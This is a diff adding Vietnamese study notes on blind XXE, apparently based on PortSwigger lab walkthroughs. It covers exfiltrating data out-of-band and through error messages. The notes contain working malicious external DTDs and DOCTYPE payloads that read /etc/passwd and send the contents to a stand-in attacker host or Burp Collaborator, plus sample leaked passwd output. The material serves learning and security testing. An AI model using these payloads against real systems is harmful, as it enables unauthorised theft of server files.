@@ -211,3 +211,131 @@
 
 > DONE:
 > ![img](../asset/xxe-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities-2.png) ![img](../asset/xxe-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities-3.png)
+
+---
+
+### Exploiting blind XXE to exfiltrate data out-of-band
+
+> Việc phát hiện `blind XXE` thông qua `out-of-band` là rất tốt, nhưng nó không chứng minh được cách thức khai thác vul.
+>
+> Mục tiêu của `attacker` là lấy sạch đi tất cả dữ liệu. Điều này có thể `explot` bằng `blind XXE` nhưng nó liên quan tới attacker lưu trữ một `DTD` độc hại trên hệ thống mà chúng kiểm soát
+
+> Ví dụ về một DTD độc hại để lấy nội dung của tệp `/ etc / passwd` như sau:
+>
+> ```
+> <!ENTITY % file SYSTEM "file:///etc/passwd">
+> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+> %eval;
+> %exfiltrate;
+> ```
+
+> DTD sẽ theo các bước sau:
+>
+> - Định nghĩa `XML parameter entity` gọi là `file`, chứa nội dung: `/etc/passwd`
+> - Định nghĩa `XML parameter entity` gọi là `eval`, chứa entity `exfiltrate`. Nó sẽ thực hiện tới 1 `URL HTTP` của `attacker` để truy vấn URL
+> - Sử dụng `eval` để cho `exfiltrate` thực hiện
+> - Sử dụng `entity exfiltrate`, để giá trị của nó được đánh giá bằng cách yêu cầu tới các URL được chỉ định
+
+> Sau đó attacker phải lưu trữ `DTD` độc hại trên hệ thống chúng đang control, thông thường bằng cách tải lên web của chúng
+>
+> ```
+> http://web-attacker.com/malicious.dtd
+> ```
+
+> Cuối cùng, attacker gửi payload XXE cho app:
+>
+> ```
+> <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+> "http://web-attacker.com/malicious.dtd"> %xxe;]>
+> ```
+
+#### Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+
+> Des: Lab chứa tính năng kiểm tra kho, nhưng k return kết quả
+>
+> Solve: `exfiltrate` file `/etc/passwd`
+
+**Giao diện**
+![img](../asset/xxe-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD-0.png)
+
+> Chặn request:
+> ![img](../asset/xxe-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD-1.png)
+
+> Bài này cần 1 server để tải DTD mã độc lên đó. Lab cũng cung cấp sẵn 1 web. Vào đó rồi deploy lên:
+> ![img](../asset/xxe-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD-2.png)
+
+> Sử dụng `server` đó để lưu trữ `file` độc, ta làm tiếp. Dùng `Burp Collaborator` tạo `link` rồi thay vào `web server`:
+>
+> `script`:
+>
+> ```
+> <!ENTITY % file SYSTEM "file:///etc/hostname">
+> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+> %eval;
+> %exfil;
+> ```
+>
+> Nó sẽ như thế này sau đó nhấn `store` ở bên `server` để lưu `script`:
+> ![img](../asset/xxe-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD-4.png)
+
+> `View exploit`:
+> ![img](../asset/xxe-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD-5.png)
+
+> `Send check stock` qua `repeater`:
+> ![img](../asset/xxe-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD-6.png)
+
+> `Script`:
+>
+> ```
+> <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+> ```
+
+> Send rồi `pull now` bên `Collaborator`:
+> ![img](../asset/xxe-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD-7.png)
+
+> Nó sẽ trả về `content` của `/etc/passwd` tại chỗ `x` vì trên `file` độc tại `server config` như vậy
+> DONE
+> ![img](../asset/xxe-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD-8.png)
+
+---
+
+### Exploiting blind XXE to retrieve data via error messages
+
+> Một cách tiếp cận khác thể khai thác `Blind XXE` là kích hoạt `XML parsing error` trong đó có lỗi chứa data nhạy cảm mà attacker muốn truy xuất.
+>
+> Điều này có hiệu lực nếu ứng dụng trả về kết quả lỗi trong `response`
+
+> Có thể kích hoạt nó với `file` chứa nội dung: `/etc/passwd` bằng mã độc `DTD`:
+>
+> ```
+> <!ENTITY % file SYSTEM "file:///etc/passwd">
+> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+> %eval;
+> %error;
+> ```
+
+> Step:
+>
+> - Định nghĩa 1 `entity` là `file`, chứa `content`: `/etc/passwd`
+> - Định nghĩa 1 `entity` là `eval`, chứa 1 khai báo động của 1 `entity parameter` gọi là `error`. Nó sẽ được đánh giá bằng cách tải 1 tệp không tồn tại chứa giá trị của `file`
+> - `eval` được sử dụng (gọi), entity này khiến việc khai báo `error` được thực hiện
+> - `error` được gọi, cố gắng tải 1 file không exist dẫn tới thông báo tên của tệp k tồn tại, là nội dung của tệp `/etc/passwd`
+
+> Lỗi như sau:
+>
+> ```
+> java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+> bin:x:2:2:bin:/bin:/usr/sbin/nologin
+> ...
+> ```
+
+#### Lab: Exploiting blind XXE to retrieve data via error messages
+
+> Tab: Practitioner
+>
+> Des: Lab chứa tính năng `check stock`, `XML` không hiện thị kết quả
+>
+> Để solve, Dùng `DTD` bên ngoài để kích hoạt lỗi hiện thị nội dung của tệp `/etc/paswd`
+
+**Giao diện**
